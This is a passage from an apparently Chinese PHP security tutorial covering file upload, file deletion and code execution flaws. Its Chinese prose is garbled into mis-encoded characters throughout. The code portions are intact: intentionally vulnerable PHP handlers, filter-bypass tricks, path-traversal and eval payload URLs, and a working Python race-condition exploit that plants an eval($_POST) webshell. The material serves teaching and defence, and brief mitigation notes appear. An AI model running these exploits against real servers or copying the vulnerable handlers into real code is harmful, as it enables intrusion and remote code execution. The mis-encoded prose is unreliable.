class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸åˆæ³•&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$new_upload_file_ext</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$filename</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Upload Success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;ä¸Šä¼ &quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>apacheæœåŠ¡å™¨å¯èƒ½åšäº†é…ç½®ä¸ä¼šè§£æç‰¹æ®Šæ‰©å±•å<br>ä½¿ç”¨å…¶ä»–æœåŠ¡å™¨å¤ç°(æˆ‘ä½¿ç”¨çš„nginx),ä¸Šä¼ php4æ‰©å±•åç»•è¿‡é»‘åå•<br><code>http://127.0.0.1/uploads/shell.php4</code></p><p>ç™½åå•æ£€æµ‹:<br>ä»…å…è®¸æŒ‡å®šçš„æ–‡ä»¶ç±»å‹ä¸Šä¼ ï¼Œæ¯”å¦‚ä»…ä¸éœ€ä¸Šä¼ jpg | gif | docç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå…¶ä»–å…¨éƒ¨ç¦æ­¢</p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡<ul><li>ç”¨åƒ AsPï¼ŒpHp ä¹‹ç±»çš„æ–‡ä»¶åç»•è¿‡é»‘åå•æ£€æµ‹</li></ul></li><li>åå•åˆ—è¡¨ç»•è¿‡<ul><li>ç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•è¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚é»‘åå•é‡Œæ²¡æœ‰ asa æˆ– cer ä¹‹ç±»</li></ul></li><li>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡<ul><li>æ¯”å¦‚å‘é€çš„ http åŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆ test.asp. æˆ– test.asp_(ä¸‹åˆ’çº¿ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼ åœ¨ windows ç³»ç»Ÿé‡Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨ burp ä¹‹ç±»é‡Œè¿›è¡Œä¿®æ”¹ï¼Œç„¶åç»•è¿‡éªŒè¯åï¼Œä¼šè¢«windows ç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ï¼Œä½†è¦æ³¨æ„ Unix&#x2F;Linux ç³»ç»Ÿæ²¡æœ‰è¿™ä¸ªç‰¹æ€§</li></ul></li><li>0x00æˆªæ–­<ul><li>æ–‡ä»¶ååç¼€å°±ä¸€ä¸ª%00å­—èŠ‚ï¼Œå¯ä»¥æˆªæ–­æŸäº›å‡½æ•°å¯¹æ–‡ä»¶åçš„åˆ¤æ–­ã€‚åœ¨è®¸å¤šè¯­è¨€å‡½æ•°ä¸­å¤„ç†å‡½æ•°ä¸­ï¼Œå¤„ç†å­—ç¬¦ä¸²ä¸­(phpç‰ˆæœ¬éœ€è¦å°äº5.3.4,magic_quotes_gpc&#x3D;Off)</li></ul></li></ul><h4 id="æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>æ–‡ä»¶å†…å®¹æ£€æµ‹</h4><p>æ–‡ä»¶å¤´æ£€æµ‹:</p><ul><li>JPG: FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF: 47 49 46 38 39 61 (GIF89a)</li><li>PNG: 89 50 4E 47<br>ç»•è¿‡æ–¹æ³•:<br>æ·»åŠ å¤´å¯¹åº”çš„æ–‡ä»¶å¤´ä¼ªé€ </li></ul><p>æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹:</p><ul><li>æ£€æŸ¥å›¾ç‰‡å¤§å°ã€å°ºå¯¸ç­‰çš„ä¿¡æ¯ã€‚<br>ç»•è¿‡æ–¹æ³•:<br>å°†ä»£ç æ³¨å…¥åˆ°æ­£å¸¸æ–‡ä»¶ä¸­(æ¯”å¦‚å›¾ç‰‡é©¬:copy &#x2F;b 1.jpg+2.php)</li></ul><h4 id="ç«äº‰ä¸Šä¼ "><a href="#ç«äº‰ä¸Šä¼ " class="headerlink" title="ç«äº‰ä¸Šä¼ "></a>ç«äº‰ä¸Šä¼ </h4><p>å½“æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨,å…ˆæš‚æ—¶ä¿å­˜,åœ¨æ£€æŸ¥æ˜¯ä¸æ˜¯ç¬¦åˆæ¡ä»¶,å¦‚æœä¸ç¬¦åˆå†åˆ æ‰ã€‚<br>åˆ©ç”¨æ€è·¯å°±æ˜¯æˆ‘ä»¬ç”¨å¤šçº¿ç¨‹ä¸æ–­ä¸Šä¼ .phpæ–‡ä»¶,åœ¨æŸä¸ªæ²¡æœ‰è¢«åˆ é™¤çš„æ—¶åˆ»å¦‚æœè®¿é—®åˆ°äº†.phpæ–‡ä»¶,å°±ç”Ÿæˆä¸€ä¸ªshell,shellå°±ä¼šå­˜åˆ°æœåŠ¡å™¨ã€‚</p><p>eg:</p><p>competionupload.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;<br>    <span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br>    <span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload fileï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success.file path is: &quot;</span>.<span class="hljs-variable">$newfile</span>.<span class="hljs-string">&quot;\n&lt;br /&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:upload the file type is not allowedï¼Œdelete the fileï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;ä¸Šä¼ &quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br>exp_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br>shell_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br><br><span class="hljs-comment"># æŒ‰ç…§è‡ªå·±çš„ç¯å¢ƒä¿®æ”¹url</span><br>upload_url = <span class="hljs-string">&#x27;http://127.0.0.1/competionupload.php&#x27;</span><br>exp_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name)<br>shell_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name)<br><br>exp_content = (<span class="hljs-string">&#x27;&lt;?php fputs(fopen(&quot;&#123;&#125;.php&quot;, &quot;w&quot;), &#x27;</span><br>               <span class="hljs-string">&#x27;\&#x27;&lt;?php @eval($_POST[&quot;qqq&quot;]) ?&gt;\&#x27;); ?&gt;&#x27;</span>)<br>exp_content = exp_content.<span class="hljs-built_in">format</span>(shell_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] upload file...&#x27;</span>)<br>        data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;ä¸Šä¼ &#x27;</span>&#125;<br>        files = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name),exp_content)&#125;<br>        resp = requests.post(upload_url,files=files,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] get shell file...&#x27;</span>)<br>        requests.get(exp_url)<br>        resp = requests.get(shell_url)<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] create &#123;&#125;.php success&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name))<br>            os._exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    threads = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># çº¿ç¨‹æ•°ä¹Ÿå¯ä»¥è‡ªå·±ä¿®æ”¹,æˆ‘è¿™é‡Œåªæ˜¯å¼€å¤ªå¤šçº¿ç¨‹æœ¬åœ°æœåŠ¡å™¨æ‰›ä¸ä½</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            t = threading.Thread(target=get,args=())<br>            threads.append(t)<br>            t.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            t = threading.Thread(target=upload,args=())<br>            threads.append(t)<br>            t.start()        <br><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            thread.join()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‚è€ƒ<a href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/">ä¸Šé¢è®²äº†19ç§æƒ…æ™¯çš„bypassæ–¹æ³•</a></p><h3 id="æ–‡ä»¶åˆ é™¤"><a href="#æ–‡ä»¶åˆ é™¤" class="headerlink" title="æ–‡ä»¶åˆ é™¤"></a>æ–‡ä»¶åˆ é™¤</h3><p>æ–‡ä»¶åˆ é™¤æ¼æ´å‡ºç°åœ¨æœ‰æ–‡ä»¶ç®¡ç†åŠŸèƒ½çš„åº”ç”¨ä¸Šå¾ˆå¤š,è¿™äº›åº”ç”¨ä¸€èˆ¬éƒ½æœ‰æ–‡ä»¶ä¸Šä¼ å’Œè¯»å–ç­‰åŠŸèƒ½ã€‚æ¼æ´åˆ©ç”¨åŸç†å’Œæ–‡ä»¶è¯»å–å·®ä¸å¤š,åªæ˜¯åˆ©ç”¨å‡½æ•°ä¸ä¸€æ ·ã€‚ä¸€èˆ¬æ˜¯å› ä¸ºåˆ é™¤æ–‡ä»¶çš„æ–‡ä»¶åå¯ä»¥ç”¨..&#x2F;è·³è½¬,æˆ–è€…æ²¡æœ‰é™åˆ¶å½“å‰ç”¨æˆ·åªèƒ½åˆ é™¤ä»–è¯¥æœ‰æƒé™åˆ é™¤çš„æ–‡ä»¶ã€‚phpä¸­è¿™ä¸ªæ¼æ´å‡½æ•°é€šå¸¸æ˜¯unlink()</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;delete&#x27;</span>)&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$basedir</span>.<span class="hljs-variable">$filename</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/filedelete.php?action=delete&amp;filename=../../../../../../../test.txt</code></p><h3 id="é˜²èŒƒ-1"><a href="#é˜²èŒƒ-1" class="headerlink" title="é˜²èŒƒ"></a>é˜²èŒƒ</h3><p>é€šç”¨é˜²èŒƒ:</p><ul><li>å¯¹æƒé™ç®¡ç†è¦åˆç†,æ¯”å¦‚ç”¨æˆ·Aä¸Šä¼ çš„æ–‡ä»¶,ä¸èƒ½è¢«åŒæƒé™çš„Bç”¨æˆ·åˆ é™¤ã€‚ç‰¹æ®Šæ–‡ä»¶æ“ä½œéœ€è¦ç‰¹æƒç”¨æˆ·æ‰èƒ½æ“ä½œ,æ¯”å¦‚åå°åˆ é™¤æ–‡ä»¶çš„æ“ä½œ,è‚¯å®šéœ€è¦é™åˆ¶ç®¡ç†å‘˜æ‰èƒ½æ“ä½œã€‚</li><li>æœ‰çš„æ–‡ä»¶æ“ä½œä¸éœ€è¦ç›´æ¥ä¼ å…¥æ–‡ä»¶å,æ¯”å¦‚ä¸‹è½½æ–‡ä»¶æ—¶,å¯ä»¥å°†æ–‡ä»¶åã€è·¯å¾„ã€ID(MD5å½¢å¼)åŠæ–‡ä»¶ä¸Šä¼ ç”¨æˆ·å­˜å…¥æ•°æ®åº“ä¸­,æ“ä½œæ—¶æ ¹æ®æ–‡ä»¶IDå’Œå½“å‰ç”¨æˆ·åå»åˆ¤æ–­å½“å‰ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™æ“ä½œæ”¹æ–‡ä»¶ã€‚</li><li>é¿å…ç›®å½•è·³è½¬ã€‚ç¦æ­¢<code>..</code>ã€<code>/</code>ã€<code>\</code>æ¥è·³è½¬ç›®å½•</li></ul><h2 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h2><p>ä»£ç æ‰§è¡Œæ¼æ´æŒ‡åº”ç”¨ç¨‹åºæœ¬èº«è¿‡æ»¤ä¸ä¸¥,ç”¨æˆ·å¯ä»¥é€šè¿‡è¯·æ±‚å°†ä»£ç æ³¨å…¥åˆ°åº”ç”¨ä¸­æ‰§è¡Œã€‚è¿™ç§æ¼æ´å¦‚æœæ²¡æœ‰è¿›è¡Œç‰¹æ®Šè¿‡æ»¤,ç›¸å½“äºä¸€ä¸ªwebåé—¨çš„å­˜åœ¨ã€‚</p><p>phpä¸­å¯¼è‡´è¯¥æ¼æ´çš„å‡½æ•°:</p><ul><li>eval</li><li>assert</li><li>preg_replace</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li><li>phpåŠ¨æ€å‡½æ•°($a($b))</li><li>â€¦</li></ul><p>eval()å’Œassert()å‡½æ•°å¯¼è‡´çš„ä»£ç æ‰§è¡Œæ¼æ´å¤§å¤šæ•°æ˜¯å› ä¸ºè½½å…¥ç¼“å­˜æˆ–è€…æ¨¡æ¿ä»¥åŠå¯¹å˜é‡çš„å¤„ç†ä¸ä¸¥æ ¼å¯¼è‡´,æ¯”å¦‚ç›´æ¥æŠŠä¸€ä¸ªå¤–éƒ¨å¯æ§çš„å‚æ•°æ‹¼æ¥åˆ°æ¨¡æ¿é‡Œé¢ï¼Œç„¶åè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°å»å½“æˆphpä»£ç æ‰§è¡Œã€‚</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_a</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_a method&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_b</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_b method&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;action_&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;();&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_eval.php?m=b</code></p><p><code>http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//</code></p><p>preg_replace()å‡½æ•°(<strong>php5.5ä¹‹å‰å¯ç”¨</strong>)å¯¼è‡´ä»£ç æ‰§è¡Œéœ€è¦å­˜åœ¨<code>/e</code>å‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°åŸæœ¬æ˜¯ç”¨æ¥å¤„ç†å­—ç¬¦ä¸²çš„ï¼Œå› æ­¤æ¼æ´å‡ºç°æœ€å¤šçš„æ˜¯åœ¨å¯¹å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œæ¯”å¦‚URLã€HTMLæ ‡ç­¾åŠæ–‡ç« å†…å®¹è¿‡æ»¤ç­‰åœ°æ–¹ã€‚</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html_body</span> = <span class="hljs-string">&#x27;&lt;a &#123;$&#123;phpinfo()&#125;&#125;&gt;&lt;/a&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(&lt;/?)(\w+)([^&gt;]*&gt;)#e&quot;</span>,<br>              <span class="hljs-string">&#x27;&quot;\\1&quot;.strtoupper(&quot;\\2&quot;).&quot;\\3&quot;&#x27;</span>,<span class="hljs-variable">$html_body</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_preg.php</code></p><p>ç”±äºphpç‰¹æ€§çš„åŸå› ï¼Œphpå‡½æ•°å¯ä»¥ç›´æ¥ç”±å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¯¼è‡´åŠ¨æ€æ‰§è¡Œå‡½æ•°ã€‚</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_dynfunc.php?a=assert&amp;b=phpinfo()</code></p><p>è¿˜æœ‰å…¶ä»–å‡½æ•°ï¼Œå¯ä»¥è‡ªè¡ŒæŸ¥é˜…</p><p>å®é™…ç¯å¢ƒä¸­å¯ä»¥ç»“åˆæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ç™½åå•å¯¹å‚æ•°è¿‡æ»¤</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>ä»£ç æ‰§è¡Œæ˜¯æŒ‡å¯ä»¥æ‰§è¡Œä»£ç 